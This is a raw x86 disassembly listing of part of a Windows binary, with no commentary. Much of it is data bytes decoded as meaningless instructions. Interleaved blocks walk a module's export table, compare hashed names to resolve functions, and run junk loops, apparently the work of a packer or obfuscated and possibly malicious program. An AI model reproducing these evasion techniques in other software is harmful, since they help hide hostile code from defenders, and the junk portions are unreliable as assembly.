  40194d:	xchg   ecx,eax
  40194e:	sub    BYTE PTR [ebp+0x5ab842ed],al
  401954:	xchg   edi,eax
  401955:	loope  0x4019be
  401957:	sub    al,0x39
  401959:	outs   dx,BYTE PTR ds:[esi]
  40195a:	mov    esi,0xcf336a0c
  40195f:	out    0x47,al
  401961:	test   DWORD PTR [esp+edi*4],edx
  401964:	push   edx
  401965:	mov    ecx,0xf834fa0f
  40196a:	jnp    0x4018fd
  40196c:	popf   
  40196d:	hlt    
  40196e:	inc    ecx
  40196f:	add    eax,0x669ad3d
  401974:	jecxz  0x401995
  401976:	xchg   DWORD PTR [ebp-0x36f58844],ecx
  40197c:	push   ebp
  40197d:	adc    BYTE PTR [ecx+0xe],al
  401980:	push   cs
  401981:	data16 fmulp st(6),st
  401984:	pop    ebx
  401985:	adc    al,0xea
  401987:	sbb    bl,BYTE PTR [ebx]
  401989:	ss out dx,eax
  40198b:	les    esi,FWORD PTR [bp+di]
  40198e:	shl    esp,1
  401990:	addr16 retf 0xe075
  401994:	fist   WORD PTR ds:0xa3898ff
  40199a:	jmp    0x4019f2
  40199c:	adc    BYTE PTR [edx-0x55],0x23
  4019a0:	push   edi
  4019a1:	je     0x40194e
  4019a3:	mov    al,ds:0xcd95197e
  4019a8:	sahf   
  4019a9:	nop
  4019aa:	cmp    bl,BYTE PTR [edx-0x59c0e38b]
  4019b0:	addr16 push ds
  4019b2:	and    eax,0xf70b1958
  4019b7:	adc    BYTE PTR [edx+0x63],al
  4019ba:	cmp    BYTE PTR [ebp+0x34],bl
  4019bd:	cmp    ah,BYTE PTR [edx]
  4019bf:	(bad)  
  4019c0:	fs pushf 
  4019c2:	imul   eax,DWORD PTR [eax],0x2b
  4019c5:	clc    
  4019c6:	xchg   edi,eax
  4019c7:	lock jg 0x401a39
  4019ca:	imul   DWORD PTR [edi]
  4019cc:	mov    dh,0x70
  4019ce:	add    dl,cl
  4019d0:	push   DWORD PTR [ebp+0x8]
  4019d3:	call   0x408097
  4019d8:	jmp    0x401aab
  4019dd:	cld    
  4019de:	mov    ecx,eax
  4019e0:	mov    ecx,ebx
  4019e2:	dec    ebx
  4019e3:	mov    edi,0x495a648b
  4019e8:	aad    0xc3
  4019ea:	cdq    
  4019eb:	mov    cl,0x30
  4019ed:	lods   al,BYTE PTR ds:[esi]
  4019ee:	jae    0x401a6c
  4019f0:	jl     0x401994
  4019f2:	jl     0x401a70
  4019f4:	jl     0x401a1a
  4019f6:	pop    ds
  4019f7:	inc    DWORD PTR ds:0x70d16187
  4019fd:	loope  0x401982
  4019ff:	push   ds
  401a00:	pop    ebx
  401a01:	mov    al,ds:0x135c1dca
  401a06:	(bad)  
  401a07:	jl     0x401a30
  401a09:	fs jo  0x401a66
  401a0c:	mov    DWORD PTR [eax],esp
  401a0e:	mov    ah,0x8b
  401a10:	pop    ss
  401a11:	sub    dl,BYTE PTR [esi]
  401a13:	js     0x401a10
  401a15:	sar    BYTE PTR [edi],1
  401a17:	dec    esp
  401a18:	fidivr WORD PTR [eax-0x11]
  401a1b:	mov    BYTE PTR ds:0xe55ab642,ah
  401a21:	inc    edi
  401a22:	scas   al,BYTE PTR es:[edi]
  401a23:	push   edi
  401a24:	loopne 0x401a1e
  401a26:	(bad)
  401a29:	es and al,0x79
  401a2c:	ret    
  401a2d:	ret    0x6397
  401a30:	push   esp
  401a31:	pop    ecx
  401a32:	test   BYTE PTR [ebx+0x76],0x39
  401a36:	out    dx,al
  401a37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401a38:	mov    ds:0x1b737caa,eax
  401a3d:	xor    DWORD PTR [eax-0x5cf06bd],edx
  401a43:	mov    ah,0x24
  401a45:	mov    edi,0xb57607b7
  401a4a:	ret    
  401a4b:	out    dx,eax
  401a4c:	in     al,dx
  401a4d:	aas    
  401a4e:	jno    0x401ace
  401a50:	push   eax
  401a51:	aaa    
  401a52:	idiv   BYTE PTR [ecx+0x37]
  401a55:	pop    ebp
  401a56:	clc    
  401a57:	jmp    0xacc68353
  401a5c:	mov    esi,0xf64655c0
  401a61:	std    
  401a62:	sub    eax,0xcdd72cbf
  401a67:	lock jmp 0x6c445685
  401a6d:	lods   eax,DWORD PTR ds:[esi]
  401a6e:	inc    eax
  401a6f:	pop    ebp
  401a70:	sub    DWORD PTR [ecx],ebx
  401a72:	int    0xc4
  401a74:	scas   eax,DWORD PTR es:[edi]
  401a75:	mov    ecx,0x7155b8fa
  401a7a:	and    edx,DWORD PTR [ebx]
  401a7c:	jnp    0x401ad7
  401a7e:	lea    ebp,[ebp-0x43eb1857]
  401a84:	retf   0x9d21
  401a87:	call   0x35f1d890
  401a8c:	cmp    al,0xf3
  401a8e:	test   al,0xa3
  401a90:	push   ecx
  401a91:	rcl    ch,0xcb
  401a94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a95:	sbb    ch,BYTE PTR [edx-0x52]
  401a98:	jno    0x401a46
  401a9a:	and    al,0x77
  401a9c:	adc    eax,0x53188bb1
  401aa1:	addr16 mov ecx,0x98f681da
  401aa7:	call   0xec45:0x89a64e23
  401aae:	mov    eax,DWORD PTR [ebp-0x4]
  401ab1:	add    DWORD PTR ds:0x4427a4,ecx
  401ab7:	mov    ecx,DWORD PTR [ebp-0x14]
  401aba:	xor    eax,esi
  401abc:	add    eax,ebx
  401abe:	mov    DWORD PTR ds:0x413412,0x6998
  401ac8:	cmp    ecx,eax
  401aca:	mov    DWORD PTR ds:0x4427ac,0x4e4a
  401ad4:	je     0x4021a9
  401ada:	mov    eax,DWORD PTR [ebp-0x14]
  401add:	mov    eax,DWORD PTR [eax+0x18]
  401ae0:	and    DWORD PTR ds:0x43fbec,0x0
  401aea:	xor    ecx,ecx
  401aec:	add    ecx,DWORD PTR ds:0x43fbec
  401af2:	inc    ecx
  401af3:	mov    DWORD PTR ds:0x43fbec,ecx
  401af9:	cmp    DWORD PTR ds:0x43fbec,0x7
  401b00:	jne    0x401b19
  401b06:	push   0x41080d
  401b0b:	push   0x4105df
  401b10:	push   DWORD PTR [ebp-0x1c]
  401b13:	call   DWORD PTR ds:0x43c824
  401b19:	cmp    DWORD PTR ds:0x43fbec,0x6
  401b20:	jne    0x401b35
  401b26:	xor    ecx,ecx
  401b28:	xor    ecx,DWORD PTR ds:0x43fbec
  401b2e:	inc    ecx
  401b2f:	mov    DWORD PTR ds:0x43fbec,ecx
  401b35:	cmp    DWORD PTR ds:0x43fbec,0x12
  401b3c:	jb     0x401aea
  401b42:	sub    DWORD PTR ds:0x413416,0x3b9b
  401b4c:	jmp    0x401c1f
  401b51:	inc    ecx
  401b52:	adc    eax,0x9d621a92
  401b57:	jns    0x401bc6
  401b59:	retf   
  401b5a:	push   cs
  401b5b:	ins    BYTE PTR es:[edi],dx
  401b5c:	jno    0x401ae1
  401b5e:	outs   dx,BYTE PTR ds:[esi]
  401b5f:	xor    eax,0x7c72d2cf
  401b64:	jl     0x401b08
  401b66:	jl     0x401be4
  401b68:	jl     0x401b50
  401b6a:	popf   
  401b6b:	lock push edx
  401b6d:	int3   
  401b6e:	mov    esi,ebx
  401b70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b71:	or     DWORD PTR [esi],ebx
  401b73:	sahf   
  401b74:	leave  
  401b75:	fs (bad) 
  401b78:	lock add al,0xa6
  401b7b:	mov    DWORD PTR [edx-0x5],ebp
  401b7e:	dec    eax
  401b7f:	and    bl,BYTE PTR [esi+0x6c3a5f78]
  401b85:	and    BYTE PTR [eax+0x279e9572],bh
  401b8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b8c:	leave  
  401b8d:	cdq    
  401b8e:	or     eax,0xe0619b88
  401b93:	mov    al,ds:0x15fc53d3
  401b98:	cmp    dl,BYTE PTR [esi]
  401b9a:	xlat   BYTE PTR ds:[ebx]
  401b9b:	arpl   WORD PTR fs:[ebx-0x6e989f88],cx
  401ba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ba3:	stos   DWORD PTR es:[edi],eax
  401ba4:	ds dec eax
  401ba6:	add    DWORD PTR [edi],esp
  401ba8:	ja     0x401b86
  401baa:	push   ds
  401bab:	or     cl,BYTE PTR [esi-0x58]
  401bae:	pop    es
  401baf:	sbb    ebx,DWORD PTR [ecx]
  401bb1:	ja     0x401b73
  401bb3:	xchg   esp,eax
  401bb4:	(bad)  
  401bb5:	adc    eax,0x6df327cd
  401bba:	push   ds
  401bbb:	push   ebx
  401bbc:	out    0xce,eax
  401bbe:	cmp    DWORD PTR [ecx-0x2cd1702a],0x13ccc580
  401bc8:	imul   ebp,ebx,0xd9fb61a5
  401bce:	dec    esp
  401bcf:	sub    BYTE PTR [ebp-0x1e7aef02],cl
  401bd5:	ins    BYTE PTR es:[edi],dx
  401bd6:	sar    BYTE PTR [edx],1
  401bd8:	mov    al,0xe5
  401bda:	add    BYTE PTR [edi+0x5f],cl
  401bdd:	inc    ecx
  401bde:	(bad)  
  401be0:	push   esp
  401be1:	jp     0x401c0f
  401be3:	pop    edx
  401be4:	rol    DWORD PTR ds:0xc2003588,0xb
  401beb:	js     0x401bd4
  401bed:	pop    esi
  401bee:	in     eax,dx
  401bef:	outs   dx,DWORD PTR ds:[esi]
  401bf0:	cmp    al,0x11
  401bf2:	mov    esp,0x5c43a7e7
  401bf7:	lods   al,BYTE PTR ds:[esi]
  401bf8:	mov    bh,0x4d
  401bfa:	shr    cl,cl
  401bfc:	dec    esp
  401bfd:	pop    edi
  401bfe:	(bad)  
  401bff:	lods   al,BYTE PTR ds:[esi]
  401c00:	pop    edx
  401c01:	jae    0x401c4f
  401c03:	push   0x1f7d887b
  401c08:	xchg   esi,eax
  401c09:	adc    DWORD PTR ds:0x183a1385,0xffffffbe
  401c10:	lock mov al,ds:0xa020e539
  401c16:	inc    esp
  401c17:	mov    bh,0x2b
  401c19:	jl     0x401c66
  401c1b:	mov    al,ds:0x8913224a
  401c20:	inc    ebp
  401c21:	loopne 0x401ba4
  401c23:	loope  0x401bd8
  401c25:	push   0x458b0000
  401c2a:	in     al,dx
  401c2b:	mov    ecx,DWORD PTR [ebp+0x8]
  401c2e:	and    DWORD PTR ds:0x43fbf4,0x4427b8
  401c38:	add    ecx,DWORD PTR [eax+0x20]
  401c3b:	movzx  eax,BYTE PTR ds:0x44537c
  401c42:	and    eax,DWORD PTR ds:0x4427bc
  401c48:	mov    ds:0x44537c,eax
  401c4d:	mov    DWORD PTR [ebp-0x28],ecx
  401c50:	sub    DWORD PTR ds:0x41341e,ecx
  401c56:	mov    eax,DWORD PTR [ebp-0x14]
  401c59:	and    DWORD PTR ds:0x4105cb,0x0
  401c63:	jmp    0x401c75
  401c68:	mov    ecx,DWORD PTR ds:0x4105cb
  401c6e:	inc    ecx
  401c6f:	mov    DWORD PTR ds:0x4105cb,ecx
  401c75:	cmp    DWORD PTR ds:0x4105cb,0x1d
  401c7c:	jae    0x401cc9
  401c82:	cmp    DWORD PTR ds:0x4105cb,0x9
  401c89:	jne    0x401caa
  401c8f:	push   DWORD PTR [ebp-0x20]
  401c92:	push   0x8068
  401c97:	push   0x67b9
  401c9c:	push   0x41082b
  401ca1:	push   DWORD PTR [ebp-0x24]
  401ca4:	call   DWORD PTR ds:0x43c5a8
  401caa:	cmp    DWORD PTR ds:0x4105cb,0x8
  401cb1:	jne    0x401cc4
  401cb7:	mov    ecx,DWORD PTR ds:0x4105cb
  401cbd:	inc    ecx
  401cbe:	mov    DWORD PTR ds:0x4105cb,ecx
  401cc4:	jmp    0x401c68
  401cc9:	mov    ecx,DWORD PTR [ebp+0x8]
  401ccc:	not    DWORD PTR ds:0x43fbe4
  401cd2:	add    ecx,DWORD PTR [eax+0x24]
  401cd5:	xor    DWORD PTR ds:0x4427b8,0x6435
  401cdf:	mov    DWORD PTR [ebp-0x2c],ecx
  401ce2:	jmp    0x401db5
  401ce7:	cmp    edi,DWORD PTR [ebx]
  401ce9:	mov    eax,0xbd95b815
  401cee:	cmp    eax,0x3403dcf7
  401cf3:	test   BYTE PTR [ecx+0x7518ef4e],0x7c
  401cfa:	jl     0x401c9e
  401cfc:	jl     0x401d7a
  401cfe:	jl     0x401d2c
  401d00:	or     al,0x4f
  401d02:	fwait
  401d03:	loopne 0x401cc0
  401d05:	enter  0xab5c,0xa3
  401d09:	jmp    DWORD PTR [ebx-0x1829c0c7]
  401d0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401d10:	or     al,0x66
  401d12:	inc    eax
  401d13:	dec    edx
  401d14:	mov    dh,0xfa
  401d16:	pushf  
  401d17:	inc    esi
  401d18:	dec    ebx
  401d19:	pop    ebx
  401d1a:	and    DWORD PTR [edx-0x2157991],eax
  401d20:	ds mov dl,0x89
  401d23:	cld    
  401d24:	imul   ebp,DWORD PTR [ebx],0xfffffffb
  401d27:	fsub   DWORD PTR [ecx]
  401d29:	jp     0x401d26
  401d2b:	and    BYTE PTR [ebp+0x27],al
  401d2e:	pop    esp
  401d2f:	pop    ds
  401d30:	fsubr  st(5),st
  401d32:	or     DWORD PTR [esi+ecx*2-0x1c],esi
  401d36:	dec    esp
  401d37:	cmp    ebx,DWORD PTR [edi*8-0x2f8cef9a]
  401d3e:	in     al,dx
  401d3f:	inc    ebp
  401d40:	dec    edx
  401d41:	xchg   ebp,eax
  401d42:	xor    eax,0x5397144
  401d47:	or     al,BYTE PTR ds:0xe6953f1c
  401d4d:	test   eax,0x5effaf15
  401d52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d53:	retf   
  401d54:	push   eax
  401d55:	icebp  
  401d56:	jmp    0xfd9f9d07
  401d5b:	sub    eax,DWORD PTR [eax+0x1a]
  401d5e:	pop    edx
  401d5f:	les    ebp,FWORD PTR [ecx-0x69]
  401d62:	push   esi
  401d63:	or     al,0xe
  401d65:	pushf  
  401d66:	mov    ebx,0xe067684c
  401d6b:	xor    ch,dh
  401d6d:	daa    
  401d6e:	push   cs
  401d6f:	lahf   
  401d70:	ins    DWORD PTR es:[edi],dx
  401d71:	aas    
  401d72:	data16 sbb cl,BYTE PTR [edx+0x2ffd7ac3]
  401d79:	mov    eax,ds:0x48498975
  401d7e:	cwde   
  401d7f:	retf   0x9f3c
  401d82:	mov    ebp,0xd67af13f
  401d87:	pop    esi
  401d88:	or     al,bh
  401d8a:	adc    ebp,0x9550a81c
  401d90:	sbb    eax,ebx
  401d92:	push   eax
  401d93:	in     al,dx
  401d94:	clc    
  401d95:	and    BYTE PTR [esi+0x2e0d3858],bh
  401d9b:	pop    ss
  401d9c:	mov    ebp,0xd3ef1160
  401da1:	mov    ds:0x93d9504d,al
  401da6:	bound  esi,QWORD PTR [esi+eiz*1+0x218cc18a]
  401dad:	push   edx
  401dae:	int3   
  401daf:	jo     0x401d36
  401db1:	push   ecx
  401db2:	fs retf 0x8baa
  401db6:	inc    ebp
  401db7:	in     al,dx
  401db8:	mov    DWORD PTR ds:0x4105db,0x19
  401dc2:	cmp    DWORD PTR ds:0x4105db,0x0
  401dc9:	je     0x401e11
  401dcf:	cmp    DWORD PTR ds:0x4105db,0xb
  401dd6:	jne    0x401de5
  401ddc:	push   DWORD PTR [ebp-0x24]
  401ddf:	call   DWORD PTR ds:0x43c5ac
  401de5:	cmp    DWORD PTR ds:0x4105db,0xc
  401dec:	jne    0x401dff
  401df2:	mov    ecx,DWORD PTR ds:0x4105db
  401df8:	dec    ecx
  401df9:	mov    DWORD PTR ds:0x4105db,ecx
  401dff:	mov    ecx,DWORD PTR ds:0x4105db
  401e05:	dec    ecx
  401e06:	mov    DWORD PTR ds:0x4105db,ecx
  401e0c:	jmp    0x401dc2
  401e11:	mov    ecx,DWORD PTR [ebp+0x8]
  401e14:	add    ecx,DWORD PTR [eax+0x1c]
  401e17:	xor    esi,esi
  401e19:	mov    DWORD PTR [ebp-0x14],ecx
  401e1c:	jmp    0x401eef
  401e21:	xor    al,0x72
  401e23:	mov    ds:0x46657dd5,eax
  401e28:	sub    eax,0xe5b1e0bc
  401e2d:	inc    edx
  401e2e:	fstp   QWORD PTR [eax+0x7c754ec8]
  401e34:	jl     0x401dd8
  401e36:	jl     0x401eb4
  401e38:	jl     0x401e76
  401e3a:	shl    BYTE PTR [ebx+0x2c],cl
  401e3d:	(bad)  
  401e3e:	fiadd  WORD PTR [esp+esi*8-0x670deb49]
  401e45:	dec    ecx
  401e46:	mov    dh,0x31
  401e48:	lahf   
  401e49:	fistp  DWORD PTR [eax]
  401e4b:	push   edi
  401e4c:	pop    edi
  401e4d:	mov    edx,0xc0915191
  401e52:	iret   
  401e53:	mov    dl,dl
  401e55:	(bad)  
  401e57:	dec    esp
  401e58:	jg     0x401e5a
  401e5a:	mov    ah,0x54
  401e5c:	fld    QWORD PTR [ecx-0x7420ce25]
  401e62:	xchg   esp,eax
  401e63:	add    BYTE PTR [edx],0xdf
  401e66:	in     eax,0x9c
  401e68:	das    
  401e69:	jecxz  0x401e79
  401e6b:	add    eax,0x2d5a8c45
  401e70:	mov    BYTE PTR [ebx+eiz*8],ah
  401e73:	pop    esp
  401e74:	fidivr DWORD PTR [eax-0x79fd4e2c]
  401e7a:	rcr    DWORD PTR [edx+0x2460f73a],0xf5
  401e81:	shr    DWORD PTR [eax],1
  401e83:	mov    gs,eax
  401e85:	sbb    al,0x5d
  401e87:	cmp    al,0x8a
  401e89:	inc    eax
  401e8a:	mov    ah,BYTE PTR [eax]
  401e8c:	out    0xb0,al
  401e8e:	pop    es
  401e8f:	dec    ebx
  401e90:	shr    DWORD PTR ds:[edx-0x198fff0f],cl
  401e97:	xchg   esp,eax
  401e98:	inc    esi
  401e99:	(bad)  
  401e9a:	or     bh,BYTE PTR [edi]
  401e9c:	push   es
  401e9d:	add    BYTE PTR [ebp-0x78],cl
  401ea0:	aam    0x37
  401ea2:	mov    al,ds:0x2e75a2d1
  401ea7:	fild   QWORD PTR [ebx-0x24]
  401eaa:	jg     0x401e7f
  401eac:	loop   0x401eb6
  401eae:	push   edx
  401eaf:	cmp    al,0x2d
  401eb1:	out    dx,al
  401eb2:	fnstsw WORD PTR [ecx]
  401eb4:	stc    
  401eb5:	fcom   DWORD PTR [eax+0x6833db52]
  401ebb:	dec    edx
  401ebc:	mov    ecx,0x970501ed
  401ec1:	adc    BYTE PTR [edx],cl
  401ec3:	sub    eax,ebp
  401ec5:	vmulss xmm7,xmm0,xmm6
  401ec9:	out    dx,al
  401eca:	pop    ebp
  401ecb:	inc    edx
  401ecc:	mov    ebx,0x91e91244
  401ed1:	mov    DWORD PTR [esi-0x549edb13],ebx
  401ed7:	(bad)  
  401ed8:	mov    ebx,0x595d9248
  401edd:	mov    ah,0x90
  401edf:	or     DWORD PTR [eax+edi*2-0x185f4413],0xf6c3c4e9
  401eea:	jns    0x401ecd
  401eec:	add    BYTE PTR [ebx-0x27ba74e9],bh
  401ef2:	mov    ecx,DWORD PTR [ebp+0x8]
  401ef5:	add    ecx,DWORD PTR [eax+edi*4]
  401ef8:	lea    eax,[ebp-0x8]
  401efb:	mov    DWORD PTR [ebp-0x30],ecx
  401efe:	push   eax
  401eff:	push   DWORD PTR [ebp-0x30]
  401f02:	jmp    0x401fd5
  401f07:	pop    esp
  401f08:	jecxz  0x401f20
  401f0a:	xchg   ebp,eax
  401f0b:	mov    ebp,0x1ee56b7d
  401f10:	jb     0x401ec2
  401f12:	daa    
  401f13:	xchg   DWORD PTR [ecx-0x33],ebx
  401f16:	sbb    ah,dh
  401f18:	je     0x401f96
  401f1a:	jl     0x401ebe
  401f1c:	jl     0x401f9a
  401f1e:	jl     0x401ebd
  401f20:	sbb    DWORD PTR [edx+0x28],0xffffffc5
  401f24:	mov    ebx,DWORD PTR [edx-0x352b6738]
  401f2a:	sbb    BYTE PTR [ebx-0x37],bl
  401f2d:	sbb    DWORD PTR [edx],edx
  401f2f:	push   esp
  401f30:	(bad)  
  401f31:	xor    dl,bh
  401f33:	and    al,0x29
  401f35:	lods   eax,DWORD PTR ds:[esi]
  401f36:	and    al,0x38
  401f38:	stc    
  401f39:	jg     0x401ed5
  401f3b:	xor    al,0xf6
  401f3d:	in     al,dx
  401f3e:	mov    esp,0xaad90916
  401f43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f44:	ret    
  401f45:	cld    
  401f46:	sub    dl,bl
  401f48:	sbb    DWORD PTR [ebx-0x6c],ebx
  401f4b:	adc    al,0x97
  401f4d:	cli    
  401f4e:	nop
  401f4f:	inc    esp
  401f50:	xor    bl,BYTE PTR [ebx]
  401f52:	xor    al,0xe9
  401f54:	push   0xee77f1ca
  401f59:	aas    
  401f5a:	jne    0x401f14
  401f5c:	fisubr DWORD PTR [esi-0x7a]
  401f5f:	mov    cl,0xb9
  401f61:	xchg   edi,eax
  401f62:	xor    dl,BYTE PTR [esi-0x75]
  401f65:	inc    esi
  401f66:	ds stos BYTE PTR es:[edi],al
  401f68:	pop    esp
  401f69:	test   ah,cl
  401f6b:	jne    0x401fe3
  401f6d:	sbb    eax,0x414df7f8
  401f72:	(bad)  
  401f74:	out    dx,al
  401f75:	xchg   esp,eax
  401f76:	or     bl,BYTE PTR [edx-0x51a9c652]
  401f7c:	sub    BYTE PTR [ecx+0x31ea109c],al
  401f82:	cmp    DWORD PTR [edx+0x31],ecx
  401f85:	out    dx,eax
  401f86:	mov    ebx,0xb7123976
  401f8b:	adc    DWORD PTR [ebx],ebp
  401f8d:	adc    BYTE PTR [esi-0x4d],0xc
  401f91:	pop    ebp
  401f92:	mov    ah,0xf6
  401f94:	test   DWORD PTR ds:0x3fb466bb,ebx
  401f9a:	loopne 0x40201a
  401f9c:	cmc    
  401f9d:	std    
  401f9e:	mov    edx,0xd2b7e00
  401fa3:	ret    
  401fa4:	mov    WORD PTR [eax],es
  401fa6:	mov    ecx,0xcafff5bd
  401fab:	or     DWORD PTR [eax],edi
  401fad:	retf   
  401fae:	cmp    dl,al
  401fb0:	out    dx,eax
  401fb1:	and    ch,cl
  401fb3:	adc    al,0xa3
  401fb5:	add    eax,0x9f9a8aef
  401fba:	sub    DWORD PTR [esi],ebp
  401fbc:	neg    ah
  401fbe:	xchg   ebp,eax
  401fbf:	shl    esi,cl
  401fc1:	cmp    DWORD PTR [ebp-0x5a],esp
  401fc4:	out    dx,al
  401fc5:	inc    esp
  401fc6:	pop    edx
  401fc7:	and    bh,BYTE PTR [ebx+edx*2-0x40bc95d]
  401fce:	test   al,0x88
  401fd0:	sbb    eax,0x5d49b5f8
  401fd5:	push   DWORD PTR [ebp+0xc]
  401fd8:	jmp    0x4020ab
  401fdd:	or     dl,BYTE PTR [eax+ebp*1]
  401fe0:	mov    dl,0x2a
  401fe2:	mov    dl,0x6a
  401fe4:	push   esp
  401fe5:	int3   
  401fe6:	xchg   ebp,eax
  401fe7:	xchg   esp,eax
  401fe8:	int    0x92
  401fea:	jnp    0x402045
  401fec:	stc    
  401fed:	cmp    dh,BYTE PTR [edi+0x7c]
  401ff0:	jl     0x401f94
  401ff2:	jl     0x402070
  401ff4:	jl     0x402005
  401ff6:	stc    
  401ff7:	add    BYTE PTR [edi],al
  401ff9:	stos   DWORD PTR es:[edi],eax
  401ffa:	daa    
  401ffb:	ins    BYTE PTR es:[edi],dx
  401ffc:	push   esp
  401ffd:	mov    dh,0xb4
  401fff:	dec    esi
  402000:	mov    edx,0xf76ca5ec
  402005:	cmc    
  402006:	loopne 0x401fe3
  402008:	ins    BYTE PTR es:[edi],dx
  402009:	fs out 0x70,al
  40200c:	rcl    DWORD PTR [esi],cl
  40200e:	popf   
  40200f:	and    esi,DWORD PTR [ecx]
  402011:	sub    DWORD PTR [ecx-0x4288e60e],ecx
  402017:	sbb    DWORD PTR [ebx],ecx
  402019:	xchg   ebx,eax
  40201a:	push   ecx
  40201b:	xor    al,0x47
  40201d:	mov    ecx,0xa081e75
  402022:	arpl   WORD PTR [edx+0x2c],di
  402025:	outs   dx,BYTE PTR ds:[esi]
  402026:	fst    QWORD PTR [ebx+0x7e215b3d]
  40202c:	jp     0x40203a
  40202e:	xor    DWORD PTR [eax],0x497def12
  402034:	call   0x4154:0x4c1c9683
  40203b:	cdq    
  40203c:	inc    ecx
  40203d:	stc    
  40203e:	mov    ah,0x33
  402040:	daa    
  402041:	sub    al,BYTE PTR [esi+esi*4-0x5cb97896]
  402048:	mov    WORD PTR [esi-0x78],gs
  40204b:	lods   eax,DWORD PTR ds:[esi]
  40204c:	jmp    0xe427:0xbed8fedb
  402053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402054:	jns    0x402083
  402056:	fsubr  st,st(4)
  402058:	mov    al,ds:0x10bb2e0d
  40205d:	stos   DWORD PTR es:[edi],eax
  40205e:	mov    ds:0x4d3ab245,eax
  402063:	mov    ebp,0xe128ad4b
  402068:	adc    al,0xdf
  40206a:	aas    
  40206b:	ja     0x402090
  40206d:	popa   
  40206e:	dec    esi
  40206f:	jmp    0x6fa7305b
  402074:	inc    DWORD PTR [eax]
  402076:	scas   al,BYTE PTR es:[edi]
  402077:	cmp    edx,DWORD PTR [edi+0x12b21520]
  40207d:	gs xchg ecx,eax
  40207f:	xchg   ebx,eax
  402080:	ins    BYTE PTR es:[edi],dx
  402081:	retf   
  402082:	add    ch,cl
  402084:	mov    bl,0x4
  402086:	xor    BYTE PTR [eax+0x40],al
  402089:	sbb    ah,BYTE PTR [ebx+eax*2+0x524e9a8c]
  402090:	mov    gs,eax
  402092:	std    
  402093:	mov    dl,0xcc
  402095:	mov    DWORD PTR [edi+eiz*4+0x6e],eax
  402099:	xchg   BYTE PTR [edi],dl
  40209b:	(bad)  
  40209c:	push   ss
  40209d:	call   0x959630ca
  4020a2:	int3   
  4020a3:	mov    ebx,0xd82a9ca7
  4020a8:	je     0x40207b
  4020aa:	sub    al,0xe8
  4020ad:	jno    0x4020af
  4020af:	add    BYTE PTR [ebx+0x4d8bfc45],cl
  4020b5:	clc    
  4020b6:	xor    eax,0x7510857
  4020bb:	add    eax,ebx
  4020bd:	cmp    ecx,eax
  4020bf:	jne    0x4021b5
  4020c5:	jmp    0x402198
  4020ca:	dec    esp
  4020cb:	xchg   esp,eax
  4020cc:	pop    edi
  4020cd:	add    BYTE PTR [edi-0x25],ah
  4020d0:	arpl   WORD PTR [eax-0x10],bp
  4020d3:	adc    ebx,DWORD PTR [eax+0x2d8dbf48]
  4020d9:	mov    eax,0x7c7c7760
  4020de:	mov    ds:0x197c7c7c,al
  4020e3:	mov    BYTE PTR [eax-0x5ec573cf],cl
  4020e9:	sbb    ebx,ebx
  4020eb:	push   0x4d308e78
  4020f0:	cmp    BYTE PTR [ebp+0x3a],dl
  4020f3:	int3   
  4020f4:	(bad)  
  4020f5:	retf   
  4020f6:	ins    BYTE PTR es:[edi],dx
  4020f7:	call   0xe9d8:0x89ff0532
  4020fe:	mov    edx,0xeea4ec7f
  402103:	push   ebp
  402104:	out    0xaa,al
  402106:	xchg   edi,eax
  402107:	std    
  402108:	rcl    BYTE PTR [esi+ecx*1],cl
  40210b:	jmp    0xee77:0xb695d89f
  402112:	popf   
  402113:	pop    eax
  402114:	in     al,0x4a
  402116:	mov    dl,0x42
  402118:	jnp    0x402106
  40211a:	adc    BYTE PTR [edx-0x37],0x7f
  40211e:	dec    edi
  40211f:	dec    eax
  402120:	ins    DWORD PTR es:[edi],dx
  402121:	daa    
  402122:	push   edi
  402123:	rsm    
  402125:	(bad)  
  402126:	mov    al,al
  402128:	repz into 
  40212a:	jecxz  0x4020ce
  40212c:	mov    DWORD PTR [ebp-0x56e6f4f1],0x36505aa2
  402136:	dec    edx
  402137:	mov    esi,ecx
  402139:	ds (bad) 
  40213b:	lahf   
  40213c:	adc    al,0xa4
  40213e:	test   DWORD PTR [edx+ecx*1+0x594b121a],0xaa86d0a
  402149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40214a:	popf   
  40214b:	jno    0x4020f9
  40214d:	pop    ebp
  40214e:	mov    eax,0x3535a0
  402153:	xchg   BYTE PTR [eax],bh
  402155:	lahf   
  402156:	xchg   ebp,eax
  402157:	(bad)  
  402158:	(bad)  
  402159:	mov    dl,0xd4
  40215b:	mov    al,ds:0x369cd5a3
  402160:	aam    0x56
  402162:	xor    DWORD PTR [esi],esp
  402164:	adc    eax,0x18b74017
  402169:	lds    esi,FWORD PTR [edx+edi*4-0x3235fd92]
  402170:	mov    dl,0x91
  402172:	add    DWORD PTR [eax+ebp*2-0x45802b87],eax
  402179:	dec    edi
  40217a:	fwait
  40217b:	cdq    
  40217c:	(bad)  
  40217d:	outs   dx,BYTE PTR ds:[esi]
  40217e:	mov    esi,DWORD PTR [ebp+0x70]
  402181:	aaa    
  402182:	dec    edx
  402183:	fbstp  TBYTE PTR [eax+ebp*1-0x51]
  402187:	or     esp,DWORD PTR [edx+0x2d7ae861]
  40218d:	stos   DWORD PTR es:[edi],eax
  40218e:	or     DWORD PTR [ecx+0x54ad3b35],ebx
  402194:	leave  
  402195:	test   BYTE PTR [ecx+0xb],ch
  402198:	mov    eax,DWORD PTR [ebp-0x20]
  40219b:	inc    edi
  40219c:	cmp    edi,eax
  40219e:	jb     0x401676
  4021a4:	jmp    0x402298
  4021a9:	mov    eax,DWORD PTR [ebp-0x4]
  4021ac:	xor    eax,esi
  4021ae:	add    eax,ebx
  4021b0:	jmp    0x402c24
  4021b5:	mov    eax,DWORD PTR [ebp-0x2c]
  4021b8:	movzx  eax,WORD PTR [eax+edi*2]
  4021bc:	mov    ecx,DWORD PTR [ebp-0x14]
  4021bf:	mov    eax,DWORD PTR [ecx+eax*4]
  4021c2:	jmp    0x402295
  4021c7:	lods   eax,DWORD PTR ds:[esi]
  4021c8:	adc    ah,BYTE PTR [edi+0x7d7da75f]
